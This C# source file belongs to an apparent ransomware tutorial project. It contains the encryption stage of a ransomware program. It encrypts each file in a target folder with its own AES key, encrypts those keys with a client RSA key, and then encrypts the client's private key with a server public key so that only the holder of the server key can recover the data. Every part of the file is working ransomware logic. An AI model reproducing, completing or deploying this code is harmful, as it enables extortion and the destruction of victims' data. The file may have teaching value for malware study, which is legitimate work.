using RansomwareTutorial.Helpers;
using RansomwareTutorial.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareTutorial.Controllers
{
    public static class EncryptionProcessor
    {
        public static void SetupWorkingItems(string workingDirectory, string aesLocation, string lockedDataLocation, string clientRSAPublicKeyLocation, string clientRsaPrivateKeyLocation,ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var rsaKey = CryptoHelper.GenerateRSAKeys();

            if (Directory.Exists(workingDirectory))
            {
                File.WriteAllText(clientRSAPublicKeyLocation, rsaKey.PublicKey);
                File.WriteAllText(clientRsaPrivateKeyLocation, rsaKey.PrivateKey);
            }

            if (!Directory.Exists(lockedDataLocation))
            {
                Directory.CreateDirectory(lockedDataLocation);
            }

            if (!Directory.Exists(aesLocation))
            {
                Directory.CreateDirectory(aesLocation);
            }
        }
        public static void LocateFilesAndEncrypt(string targetLocation, string aesLocation, string lockedDataLocation,ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var filesToEyncrpt = Directory.GetFiles(targetLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in filesToEyncrpt)
            {
                var fileBytes = File.ReadAllBytes(file);

                var aesKey = CryptoHelper.GenerateAESKey();
                var encryptor = aesKey.CreateEncryptor();

                CryptoHelper.CryptoTransformAES(encryptor, file, fileBytes, lockedDataLocation);

                File.WriteAllBytes(Path.Combine(aesLocation, $"AES_KEY-{Path.GetFileNameWithoutExtension(file)}.txt"), aesKey.Key);
                File.WriteAllBytes(Path.Combine(aesLocation, $"AES_IV-{Path.GetFileNameWithoutExtension(file)}.txt"), aesKey.IV);
            }
        }
        public static void LocateAESFilesAndEncrypt(string clientRsaPublicKeyLocation, string aesLocation,ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var clientRsaPublicKey = File.ReadAllText(clientRsaPublicKeyLocation);
            var aesKeysLocations = Directory.GetFiles(aesLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in aesKeysLocations)
            {
                var aesEncrypted = CryptoHelper.EncryptRSA(File.ReadAllBytes(file), clientRsaPublicKey);
                File.WriteAllBytes(file, aesEncrypted);
            }
        }
        public static void LocateClientRSAPrivateKeyAndEncrypt(string clientRsaPrivateKeyLocation, string serverRsaPublicKeyLocation,ref bool isHealthy)
        {
            if (!isHealthy)
                return;

            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);
            var rsaServerPublicKey = File.ReadAllText(serverRsaPublicKeyLocation);

            var privateKeyEncrypted = CryptoHelper.EncryptLongRSA(clientRsaPrivateKey, rsaServerPublicKey);
            File.WriteAllBytes(clientRsaPrivateKeyLocation, privateKeyEncrypted);
        }
    }
}
